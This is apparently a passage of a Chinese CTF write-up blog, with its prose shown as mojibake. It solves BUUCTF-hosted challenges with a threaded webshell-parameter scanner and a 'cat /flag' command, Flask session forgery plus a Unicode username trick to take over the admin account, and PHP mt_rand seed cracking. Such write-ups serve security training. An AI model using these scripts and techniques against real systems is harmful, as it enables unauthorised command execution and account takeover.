string">'http://1d941413-1227-4486-890d-581a1eda8638.node3.buuoj.cn/'</span><span class="token operator">+</span><span class="token builtin">file</span>    req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span><span class="token comment">#ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST</span>    req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>    req<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    content <span class="token operator">=</span> req<span class="token punctuation">.</span>text    <span class="token comment">#print(content)</span>    <span class="token keyword">if</span> <span class="token string">"xxxxxx"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span><span class="token comment">#å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°</span>        flag <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> a <span class="token keyword">in</span> gets<span class="token punctuation">:</span>            req <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?%s='</span><span class="token operator">%</span>a<span class="token operator">+</span><span class="token string">"echo 'xxxxxx';"</span><span class="token punctuation">)</span>            content <span class="token operator">=</span> req<span class="token punctuation">.</span>text            req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>            <span class="token keyword">if</span> <span class="token string">"xxxxxx"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                flag <span class="token operator">=</span> <span class="token number">1</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> b <span class="token keyword">in</span> posts<span class="token punctuation">:</span>                req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">:</span><span class="token string">"echo 'xxxxxx';"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                content <span class="token operator">=</span> req<span class="token punctuation">.</span>text                req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>                <span class="token keyword">if</span> <span class="token string">"xxxxxx"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                    <span class="token keyword">break</span>        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                   <span class="token comment">#flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ</span>            param <span class="token operator">=</span> a        <span class="token keyword">else</span><span class="token punctuation">:</span>            param <span class="token operator">=</span> b        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š '</span><span class="token operator">+</span><span class="token builtin">file</span><span class="token operator">+</span><span class="token string">"  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s"</span> <span class="token operator">%</span>param<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ç»“æŸæ—¶é—´ï¼š  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s1<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span><span class="token comment">#åŠ å…¥å¤šçº¿ç¨‹</span>   t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_content<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-191.png" alt loading="lazy"></p><p>è®¿é—®xk0SzyKwfzw.php?Efa5BVG=cat /flagå³å¯å¾—åˆ°flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-192.png" alt loading="lazy"></p><h2 id="2018HCTFâ€”admin"><a href="#2018HCTFâ€”admin" class="headerlink" title="2018HCTFâ€”admin"></a>2018HCTFâ€”admin</h2><p>æ ¸å¿ƒ------------------------ â‘ flask session ä¼ªé€  ï¼›â‘¡unicodeæ¬ºéª— ï¼Œ<a href="https://www.codercto.com/a/38179.html">å‚è€ƒ</a></p><p>ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-183.png" alt loading="lazy"></p><h3 id="Flask-session-ä¼ªé€ "><a href="#Flask-session-ä¼ªé€ " class="headerlink" title="Flask session ä¼ªé€ "></a>Flask session ä¼ªé€ </h3><p>å‚è€ƒæ–‡ç« ï¼š</p><ul><li><a href="https://xz.aliyun.com/t/3569">Python Webä¹‹flask session&amp;æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</a></li><li><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html#">å®¢æˆ·ç«¯ session å¯¼è‡´çš„å®‰å…¨é—®é¢˜</a></li></ul><p>åœ¨indexå’Œchangeç•Œé¢çš„æºç å¤„åˆ†åˆ«æœ‰ä¸¤å¤„æç¤ºï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-184.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-185.png" alt loading="lazy"></p><p>å¯çŸ¥éœ€è¦ç”¨æˆ·ä¸ºadminæ‰å¯ä»¥æ‹¿åˆ°flagï¼Œä¸‹è½½ä¸‹æ¥åå‘ç°webæ¡†æ¶æ˜¯ç”¨<a href="https://baike.baidu.com/item/Flask/1241509?fr=aladdin">flask</a>å†™çš„</p><p>è§£é¢˜å…·ä½“æ“ä½œå¦‚ä¸‹ï¼š</p><p>å…ˆæ³¨å†Œä¸€ä¸ªè´¦æˆ·ï¼šadmin1</p><p>åœ¨indexç•Œé¢æ‹¿åˆ°è‡ªå·±çš„sessionï¼Œè¿›è¡Œè§£ç ï¼Œä¸Šå¤§ä½¬è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    decompress <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        decompress <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>                         <span class="token string">'an exception'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>                             <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-187.png" alt loading="lazy"></p><p>åœ¨index.htmlå‘ç°åªè¦session[â€˜nameâ€™]==â€™adminâ€™å³å¯ä½œä¸ºadminç”¨æˆ·ç™»å½•ï¼Œå†å°†è§£ç å‡ºæ¥çš„sessionä¸­çš„nameæ”¹ä¸ºadminå†è¿›è¡Œä¸€æ¬¡ç¼–ç æ¥ä¼ªé€ adminçš„sessionï¼Œå¯¹sessionç¼–ç éœ€è¦SECRET_KEYï¼Œåœ¨config.pyå¤„æ‰¾åˆ°ï¼Œæ­¤å¤„ç”¨è„šæœ¬ç¼–ç ï¼Œ<a href="https://github.com/noraj/flask-session-cookie-manager">è„šæœ¬gitä¸‹è½½åœ°å€</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-188.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-186.png" alt loading="lazy"></p><p>å°†è‡ªå·±çš„sessionä¿®æ”¹ä¸ºç¼–ç åçš„sessionå³å¯å¾—åˆ°flag</p><h3 id="Unicodeæ¬ºéª—"><a href="#Unicodeæ¬ºéª—" class="headerlink" title="Unicodeæ¬ºéª—"></a>Unicodeæ¬ºéª—</h3><p>å½“è§£é¢˜æ€è·¯æ–­äº†çš„æ—¶å€™ï¼Œä¸å¦¨ç»“åˆä»£ç è§’åº¦æ€è€ƒï¼Œå‰é¢åœ¨æ”¹å¯†ç ç•Œé¢å°±æ„Ÿè§‰åˆ°ä¸å¯¹ï¼Œå› ä¸ºå¯†ç å°±ç›´æ¥æ”¹ä¸éœ€è¦éªŒè¯ä»€ä¹ˆçš„ï¼Œäºæ˜¯æ‰¾åˆ°æ”¹å¯†ç çš„changeå‡½æ•°</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span></code></pre><p>ç»å¤§ä½¬æ–‡ç« æç‚¹ï¼Œå‘ç°åœ¨è¿›è¡Œæ”¹å¯†çš„æ—¶å€™ä½¿ç”¨äº†strlowerå‡½æ•°å°†ç”¨æˆ·åè½¬æˆäº†å°å†™ï¼Œä¸€èˆ¬åœ¨pythonä¸­è½¬å°å†™ç”¨çš„éƒ½æ˜¯lowerå‡½æ•°ï¼Œäºæ˜¯è·Ÿè¿›strlowerå‡½æ•°</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username</code></pre><p>ç ”ç©¶nodeprep.prepareå‡½æ•°ï¼Œnodeprepæ˜¯ä»Twistedæ¨¡å—å¯¼å…¥çš„ï¼Œåœ¨requirements.txtæ–‡ä»¶ä¸­çœ‹åˆ°Twistedç‰ˆæœ¬ä¸æœ€æ–°ç‰ˆæœ¬ç›¸å·®ç”šè¿œï¼Œå­˜åœ¨çŒ«è…»ï¼Œ<a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/">å‚è€ƒ</a></p><p>äºæ˜¯å°±æœ‰äº†ä»¥ä¸‹çš„Unicodeç¼–ç é—®é¢˜ï¼›å…·ä½“ç¼–ç æ–¹å¼ï¼š<a href="https://unicode-table.com/cn/search/?q=%E4%BF%AE%E9%A5%B0%E5%AD%97%E6%AF%8D%E5%A4%A7%E5%86%99">ä¿®é¥°å­—æ¯å¤§å†™</a></p><p>nodeprep.prepareä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œ</p><p>á´¬-&gt;A-&gt;a;á´¬dmin-&gt;Admin-&gt;admin</p><p>å‚è€ƒï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/ba81f7598149fdce96a3ad74e3ab6ff1.png" alt loading="lazy"></p><p>æ³¨å†Œ á´¬dmin ï¼›ç™»å½• á´¬dmin ï¼Œç»è¿‡ä¸€æ¬¡strlowerå˜æˆAdminï¼Œä¿®æ”¹å¯†ç æ—¶nameåˆç»è¿‡ä¸€æ¬¡strloweræ›´æ”¹äº†adminçš„å¯†ç ï¼Œéšåå³å¯ä»¥ä¿®æ”¹åçš„å¯†ç ç™»å½•æ‹¿åˆ°flag</p><h2 id="å®‰æ’æ¯-æ–°æ˜¥ç¥ˆç¦èµ›â€”æ¯ç‡¥çš„æŠ½å¥–"><a href="#å®‰æ’æ¯-æ–°æ˜¥ç¥ˆç¦èµ›â€”æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="å®‰æ’æ¯-æ–°æ˜¥ç¥ˆç¦èµ›â€”æ¯ç‡¥çš„æŠ½å¥–"></a>å®‰æ’æ¯-æ–°æ˜¥ç¥ˆç¦èµ›â€”æ¯ç‡¥çš„æŠ½å¥–</h2><p>ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202200452558.png" alt loading="lazy"></p><p>F12å‘ç°check.phpï¼Œè®¿é—®å¾—åˆ°phpæºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id='p1'>"</span><span class="token operator">.</span><span class="token variable">$str_show</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>x        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag>æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag>æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å‘ç°mt_srand()å’Œmt_rand() å¹¶ä¸”sessionæ˜¯ç”¨éšæœºæ•°è®¾ç½®çš„</p><p>ä¸Šçˆ†ç ´å·¥å…·php_mt_seedå’Œè„šæœ¬å¾—åˆ°éšæœºæ•°ç§å­</p><pre class="language-python" data-language="python"><code class="language-python">str1<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>str2<span class="token operator">=</span><span class="token string">'cTVM5ZeUkl'</span>length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>res<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            res<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>            <span class="token keyword">break</span><span class="token keyword">print</span> res</code></pre><p>å¾—åˆ°</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token number">2</span> <span class="token number">2</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">55</span> <span class="token number">55</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">48</span> <span class="token number">48</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">31</span> <span class="token number">31</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">4</span> <span class="token number">4</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">56</span> <span class="token number">56</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">10</span> <span class="token number">10</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">11</span> <span class="token number">11</span> <span class="token number">0</span> <span class="token number">61</span></code></pre><p>çˆ†ç ´</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202201906349.png" alt loading="lazy"></p><p>å°†å¾—åˆ°çš„éšæœºç§å­æ”¾åˆ°phpè„šæœ¬ä¸­</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">654818272</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>å¾—åˆ°å­—ç¬¦ä¸²</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202202206918.png" alt loading="lazy"></p><h2 id="De1CTF-2019â€”SSRF-Me"><a href="#De1CTF-2019â€”SSRF-Me" class="headerlink" title="De1CTF-2019â€”SSRF Me"></a>De1CTF-2019â€”SSRF Me</h2><p>ç‚¹å¼€é“¾æ¥å¾—åˆ°æºç </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/env python</span><span class="token comment">#encoding=utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">import</span> socket<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> urllib<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> json<span class="token builtin">reload</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span>sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#pythonçš„æ„é€ æ–¹æ³•</span>        self<span class="token punctuation">.</span>action <span class="token operator">=</span> action        self<span class="token punctuation">.</span>param <span class="token operator">=</span> param        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign        self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment">#SandBox For Remote_Addr</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token 